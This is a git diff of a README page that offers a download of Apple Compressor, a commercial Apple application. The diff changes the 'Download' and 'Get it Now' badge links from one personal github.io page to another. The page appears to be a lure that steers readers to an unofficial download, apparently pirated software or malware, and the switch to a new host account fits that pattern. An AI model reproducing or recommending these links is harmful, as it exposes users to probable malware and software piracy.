@@ -5,7 +5,7 @@
 </p>
 
 <p align="center">
-  <a href="https://a4-glent.github.io/.github/appleCompressor">
+  <a href="https://poxmell.github.io/.github/appleCompressor">
     <img src="https://i.postimg.cc/KzMGptz1/68747470733a2f2f692e706f7374696d672e63632f5256516739596b312f62616467652e706e67-(1).png" width="200" alt="Download Apple Compressor"/>
   </a>
 </p>
@@ -81,7 +81,7 @@ The distributed processing capability is a distinctive feature that reflects Com
 
 <p align="center">
 
-[![Get it Now Apple Compressor](https://img.shields.io/badge/Get_it_Now-023E8A?style=for-the-badge&logo=apple&logoColor=white)](https://a4-glent.github.io/.github/appleCompressor)
+[![Get it Now Apple Compressor](https://img.shields.io/badge/Get_it_Now-023E8A?style=for-the-badge&logo=apple&logoColor=white)](https://poxmell.github.io/.github/appleCompressor)
 
 </p>
 
